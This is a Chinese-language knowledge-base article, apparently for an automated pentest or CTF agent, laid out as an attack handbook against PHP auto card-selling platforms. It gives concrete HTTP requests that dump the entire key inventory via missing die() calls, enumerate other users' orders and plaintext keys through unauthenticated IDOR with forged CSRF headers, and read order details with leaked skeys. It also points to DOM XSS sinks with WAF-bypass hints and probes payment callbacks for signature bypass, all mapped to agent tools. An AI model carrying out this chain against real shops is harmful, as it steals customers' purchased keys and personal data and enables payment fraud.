---
id: "ctf-website/24-database/06-card-platform"
title: "Card-Selling Platform Exploitation — 自动发卡平台攻击手册"
title_en: "Card-Selling Platform Exploitation — Auto CDK Platform Attack Handbook"
summary: >
  针对PHP自动发卡/卡密电商平台的完整攻击链：PHP die()/exit()缺失导致全量库存泄露、IDOR无认证订单枚举获取CDK明文和skey、DOM XSS（kminfo/desc字段innerHTML无转义）、支付回调签名缺失可篡改，以及act=getcount无认证信息泄露。
summary_en: >
  Complete attack chain against PHP auto card-selling/CDK e-commerce platforms: PHP die()/exit() omission enabling full inventory disclosure, IDOR unauthenticated order enumeration exposing CDK plaintext and skey, DOM XSS via unescaped kminfo/desc innerHTML, payment callback signature bypass, and act=getcount unauthenticated information disclosure.
board: "ctf-website"
category: "24-database"
signals:
  - "die() exit() 缺失"
  - "act=query IDOR"
  - "act=order skey"
  - "kminfo innerHTML XSS"
  - "ajax.php CSRF Referer"
  - "支付回调签名缺失"
  - "act=getcount 无认证"
  - "CDK 明文泄露"
mcp_tools:
  - "http_probe"
  - "run_ctf_tool"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "发卡平台"
  - "CDK 泄露"
  - "IDOR"
  - "PHP die 缺失"
  - "卡密"
  - "DOM XSS"
  - "支付回调"
  - "ajax.php"
  - "自动发卡"
  - "库存泄露"
difficulty: "intermediate"
tags:
  - "database"
  - "web"
  - "idor"
  - "xss"
  - "php"
  - "card-platform"
  - "cdk"
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---
# Card-Selling Platform Exploitation — 自动发卡平台攻击手册

> 针对 PHP 自动发卡/卡密电商平台的完整攻击链，覆盖库存泄露、IDOR、XSS 等常见漏洞模式。

## 关键词

`发卡网` `卡密` `CDK` `自动发卡` `IDOR` `PHP die缺失` `订单枚举` `库存泄露` `卡盟` `支付回调` `DOM XSS` `CSRF绕过` `Referer校验` `ajax.php`

## 0. 攻击面全景

```
发卡平台应用栈:
┌────────────────────────────────────────────┐
│  前端: Bootstrap 3/4 + jQuery + Layer     │
├────────────────────────────────────────────┤
│  后端: 纯 PHP (非框架) 或 ThinkPHP 安装器    │
│  接口: ajax.php / user/ajax.php            │
│  支付: other/submit.php / epay_return.php  │
│  回调: wxpay_notify.php / qqpay_notify.php │
├────────────────────────────────────────────┤
│  PHP 7.x + Nginx + MySQL (PDO)            │
│  WAF: 关键词检测 (AND/OR/UNION/SELECT)      │
│  CSRF: Referer + X-Requested-With 校验      │
│  验证码: 极验 Geetest (可离线模式绕过)       │
│  Session: PHPSESSID + mysid cookie         │
└────────────────────────────────────────────┘

核心攻击面:
  ▪ PHP die()/exit() 缺失 → 校验失败后代码继续执行
  ▪ IDOR → act=query/act=order 无归属校验
  ▪ DOM XSS → kminfo/desc 字段无转义直接 innerHTML
  ▪ 敏感信息泄露 → act=getcount 无认证返回统计
  ▪ 支付回调签名缺失 → wxpay/qqpay notify 可重放
```

## 1. P0: PHP 校验缺失导致全量库存泄露

### 原理

PHP 代码在校验失败后未调用 `die()`/`exit()` 终止执行，导致后续数据库查询继续运行，将所有 CDK 一次性输出。

```php
// 漏洞代码模式
function show() {
    if (!isset($_GET['orderid'])) {
        echo renderError('参数错误');   // ← 无 die()，继续执行！
    }
    if (!validateSkey(...)) {
        echo renderError('验证失败');   // ← 无 die()
    }
    $order = getOrder($_GET['orderid'] ?? 0);
    if (!$order) {
        echo renderError('订单不存在！');  // ← 无 die()
    }
    // ↓ order_id=0 → WHERE order_id=0 → 全表返回
    $cdks = getCdksByOrderId($order['id'] ?? 0);
    echo renderCdkPage($cdks);   // 全量渲染
}
```

### 利用

```http
GET /?mod=faka&action=show HTTP/1.1
Host: target.com
```

**效果**：单次请求返回全库 CDK（10万+ 条），响应可达 25MB+。无需 Cookie、Token 或任何认证。

### 检测方法

1. 枚举 `mod` 参数值（如 `faka`, `kami`, `cdk`, `card`, `query`）
2. 观察响应中是否包含多段错误页 + 数据页（堆叠输出特征）
3. 检查 `orderid=0` 或缺失时是否返回超出预期的数据量

### 下一跳

- 用响应长度、`<br/>` 数量、CDK 正则命中数判断是否全库渲染。
- 记录 `orderid` 缺失、`orderid=0`、随机 `orderid` 三组响应 diff。
- 若返回 HTML 中有分页/商品名/卡密字段，转入批量提取与去重。

## 2. P0: IDOR 无认证订单枚举

### 原理

`ajax.php?act=query` 接口仅校验 `PHPSESSID` 和 `Referer` 头，不校验登录态和订单归属，可枚举全站所有用户的订单及 CDK 明文。

### CSRF 绕过

发卡平台通常使用 Referer + X-Requested-With 头做 CSRF 防护，但攻击者可直接在请求中携带这些头部绕过：

```http
POST /ajax.php?act=query HTTP/1.1
Host: target.com
Referer: https://target.com/
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<anonymous>; mysid=<anonymous>

type=qq&qq=1&page=1
```

### 响应中的敏感字段

```json
{
  "code": 0,
  "isnext": true,
  "data": [{
    "id": "176109",       // 订单ID
    "tid": "72122",       // 商品ID
    "name": "商品名称",
    "result": "CDK明文<br/>",  // ← 已发货的卡密！
    "skey": "aa39ed38...",    // 详情查询密钥
    "input": "1"              // 下单账号
  }]
}
```

### 分页遍历

`isnext=true` 时递增 `page` 参数即可翻页，遍历全站订单。也可通过 `type=1&qq=<数字>` 按订单 ID 精确搜索。

### 下一跳

- 固定匿名 session，按 `page` 递增直到 `isnext=false`。
- 对 `type=qq/email/id` 分别测精确搜索，建立订单 ID 范围。
- 将 `result/skey/id/input/money/status` 落成 CSV，供 `act=order` 二跳使用。

## 3. P0: IDOR 订单详情读取

### 原理

`ajax.php?act=order` 使用 `id+skey` 双参数校验，但 skey 可通过 RT-001 的 IDOR 获取，且不校验请求者是否为订单购买人。

```http
POST /ajax.php?act=order HTTP/1.1
Host: target.com
Referer: https://target.com/
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<anonymous>

id=176109&skey=aa39ed38cbfc86f8c8943f874665b118
```

### 额外泄露字段

```json
{
  "code": 0,
  "name": "商品名称",
  "money": "16.50",
  "inputs": "下单账号信息",
  "kminfo": "<div>CDK HTML封装</div>",
  "desc": "商品描述HTML（含外部链接）",
  "alert": "商品提示",
  "status": "1"
}
```

### 下一跳

- 用 `act=query` 泄露的 `id+skey` 进入详情接口。
- 比较匿名、任意登录用户、订单所有者三种身份的字段差异。
- 抽取 `kminfo/desc/alert/money/inputs/status`，给 XSS、支付、发货链路继续使用。

## 4. DOM-XSS: kminfo/desc 无转义

### RT-003: kminfo → innerHTML

```javascript
// main.js 第 783-784 行
} else if (data.kminfo) {
    item += '<tr><td ...>' + data.kminfo + '</td></tr>';
}
```

CDK 内容直接 `+` 拼接 HTML，WAF 可拦截输入层的 `<script>`/`onerror`，但**自定义 HTML 元素**（`<x-custom>`）和 `data:text/html;base64,...` 格式可绕过。

### RT-004: desc → unescape → html()

```javascript
// main.js 第 128-138 行
var desc = $('#tid option:selected').attr('desc');
var descHtml = unescape(desc).replace(/&amp;/g, '&');
$('#alert_frame').html(descHtml);   // XSS sink
```

商品描述先 `escape()` 存入 option 属性，选品时 `unescape()`→`.html()` 渲染，全程无消毒。

### 利用链

1. RT-001 获取 skey → RT-002 获取 kminfo
2. 打开订单详情弹窗 → kminfo 直接拼入 HTML → XSS 执行
3. 自定义元素绕过 WAF 写入 → 管理员查看时触发

### 下一跳

- 定位 DOM sink：`innerHTML`、`.html()`、`unescape()`、字符串拼接。
- 用无交互 payload 触发订单弹窗、商品详情、管理后台预览三个渲染点。
- 若 CSP 限制脚本，转 CSS/DOM clobbering/HTML gadget，不停在 `alert(1)`。

## 5. 信息泄露: act=getcount

```http
GET /ajax.php?act=getcount HTTP/1.1
Host: target.com
Referer: https://target.com/
X-Requested-With: XMLHttpRequest
```

返回站点统计数据（有效天数、订单数、金额等），无需认证。

## 6. 支付回调签名缺失

### 微信支付回调

```http
POST /other/wxpay_notify.php HTTP/1.1
Content-Type: application/xml

<xml>
  <out_trade_no>1</out_trade_no>
  <transaction_id>test</transaction_id>
  <total_fee>1</total_fee>
</xml>
```

签名验证失败时返回 `<return_code>FAIL</return_code>`，但如果签名校验可绕过或密钥泄露，可重放/篡改支付回调。

### QQ 支付回调

```
POST /other/qqpay_notify.php
```
返回 "签名失败"，同样存在签名校验问题。

## 7. 攻击链总结

```
信息收集:
  └── GET / → 识别 CMS 类型，提取 cid/tid 结构
  └── main.js → 枚举全量 API Actions (gettool/getcount/query/order/pay...)
  └── ?mod= → 枚举路由系统 (mod=faka/mod=admin)

★ 全量库存提取:
  └── GET /?mod=faka&action=show (无认证)
        → PHP die()缺失 → 全库 CDK 一次性泄露

IDOR 打通:
  └── 匿名 Session → POST ajax.php?act=query (type=qq&qq=1&page=1)
        → 返回 10 条/页（含 CDK 明文 + skey）
        → isnext=true 翻页枚举全量
  └── POST ajax.php?act=order (id=XXX&skey=XXX)
        → 返回 kminfo（CDK HTML）、money、inputs

XSS 链路:
  └── act=order → kminfo 直接 innerHTML → DOM-XSS
  └── act=gettool → desc escape/unescape → .html() → DOM-XSS
```

## 8. 实战判定矩阵

| 信号 | Probe | 命中标志 | 下一跳 |
|---|---|---|---|
| `die/exit` 缺失 | 缺失 `orderid` / `orderid=0` | 错误页后继续出现 CDK/订单 HTML | 全量库存提取 |
| `act=query` | 匿名 session + `page=1..N` | `isnext=true` 且 `result/skey` 出现 | 订单详情 IDOR |
| `act=order` | `id+skey` | 匿名可读 `kminfo/money/inputs` | 数字商品发货链 |
| `kminfo/desc` | 商品描述/卡密 HTML | 详情弹窗 DOM 执行 | 管理后台 XSS |
| `getcount` | GET/POST + AJAX 头 | 订单数/金额/库存统计 | 估算枚举范围 |
| 支付回调 | 空签名/错误签名/重放 | 订单状态或发货状态变化 | 支付绕过 |

## Evidence

| 风险点 | 证据 |
|--------|------|
| 全量库存泄露 | `?mod=faka&action=show` 请求/响应、CDK 字段字段样例、响应条数 |
| IDOR 订单枚举 | `act=query` 页码、匿名 Session、`isnext` 翻页证据、订单 ID 范围 |
| 订单详情读取 | `act=order` 的 `id+skey` 请求、kminfo/money/inputs 字段 |
| DOM-XSS | kminfo/desc 注入 payload、DOM sink、浏览器执行截图或控制台证据 |
| 支付回调 | 未签名/错误签名回调请求、订单状态变化或明确错误差异 |
| 失败样本 | 只出现错误页、无 CDK 字段、`skey` 绑定订单所有者、回调明确签名失败且状态不变 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 card platform、IDOR、payment callback、DOM-XSS 搜索 |
| HTTP 探测 | `http_probe` | 验证 show/query/order/getcount/pay notify 接口差异 |
| 工具执行 | `run_ctf_tool` | 调用枚举脚本、Playwright/XSS 验证或 Burp 导出复放 |
| 证据记录 | `workspace_write_text` | 保存订单、CDK 字段、请求响应与约束对比 |

## 9. 关联技术

- [[sqli-nosqli]] — WAF 绕过与 SQL 注入
- [[01-idor-enumeration]] — IDOR 枚举技术
- [[payment-php]] — PHP 支付专项攻击
- [[payment-digital-goods]] — 数字商品交付
- [[file-upload-xxe-lfi]] — XXE 与文件包含
